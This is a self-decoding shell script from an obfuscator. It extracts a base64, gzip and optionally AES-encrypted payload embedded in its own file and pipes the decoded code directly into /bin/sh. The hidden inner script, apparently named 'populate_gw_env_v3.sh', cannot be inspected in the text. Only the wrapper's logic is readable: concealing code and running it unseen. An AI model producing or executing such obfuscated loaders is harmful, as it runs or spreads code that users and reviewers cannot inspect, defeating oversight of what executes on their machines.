#!/usr/bin/env sh
# Self-decoding shell script (gzip+base64, optional AES-256-CBC via OpenSSL)
# If encrypted: set OBF_PASSPHRASE env or you will be prompted interactively.

set -eu

need() {
  command -v "$1" >/dev/null 2>&1
}

dec_b64() {
  # Decode base64 from stdin to stdout using available tools
  if need base64; then base64 -d 2>/dev/null || base64 --decode; return; fi
  if need openssl; then openssl base64 -d; return; fi
  if need python3; then python3 - <<'PY'
import sys, base64
sys.stdout.buffer.write(base64.b64decode(sys.stdin.buffer.read()))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, base64
sys.stdout.write(base64.b64decode(sys.stdin.read()))
PY
  return; fi
  if need perl; then perl -MMIME::Base64 -ne 'print decode_base64($_)'; return; fi
  if need busybox; then busybox base64 -d; return; fi
  echo "No base64 decoder found." >&2; exit 1
}

dec_gzip() {
  # Decompress gzip from stdin to stdout
  if need gzip; then gzip -dc; return; fi
  if need busybox; then busybox gzip -dc; return; fi
  # Python fallback using zlib
  if need python3; then python3 - <<'PY'
import sys, zlib
sys.stdout.buffer.write(zlib.decompress(sys.stdin.buffer.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  if need python; then python - <<'PY'
import sys, zlib
sys.stdout.write(zlib.decompress(sys.stdin.read(), 16+zlib.MAX_WBITS))
PY
  return; fi
  echo "No gzip decompressor found." >&2; exit 1
}

dec_aes() {
  # Decrypt AES-256-CBC with OpenSSL from stdin to stdout using OBF_PASSPHRASE
  if ! need openssl; then
    echo "OpenSSL not available for AES decryption." >&2; exit 1
  fi
  pass="${OBF_PASSPHRASE:-}"
  if [ -z "$pass" ]; then
    printf "Enter passphrase: " >&2
    stty -echo 2>/dev/null || true
    IFS= read -r pass || true
    stty echo 2>/dev/null || true
    echo >&2
  fi
  # pbkdf2 because the obfuscator used it
  OPENSSL_PASS="pass:$pass" exec openssl enc -d -aes-256-cbc -pbkdf2 -pass "$OPENSSL_PASS"
}

# Metadata injected by obfuscator
OBF_ENCRYPTED="0"

# Payload below between markers
PAYLOAD_B64_START="__OBF_B64_PAYLOAD_START__"
PAYLOAD_B64_END="__OBF_B64_PAYLOAD_END__"

# Extract the base64 payload lines
extract_payload() {
  awk "/$PAYLOAD_B64_START/{flag=1;next}/$PAYLOAD_B64_END/{flag=0}flag" "$0"
}

run() {
  if [ "$OBF_ENCRYPTED" = "1" ]; then
    extract_payload | dec_b64 | dec_aes | dec_gzip | /bin/sh -s -- "$@"
  else
    extract_payload | dec_b64 | dec_gzip | /bin/sh -s -- "$@"
  fi
}

run "$@"
exit 0

__OBF_B64_PAYLOAD_START__
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
AA==
__OBF_B64_PAYLOAD_END__
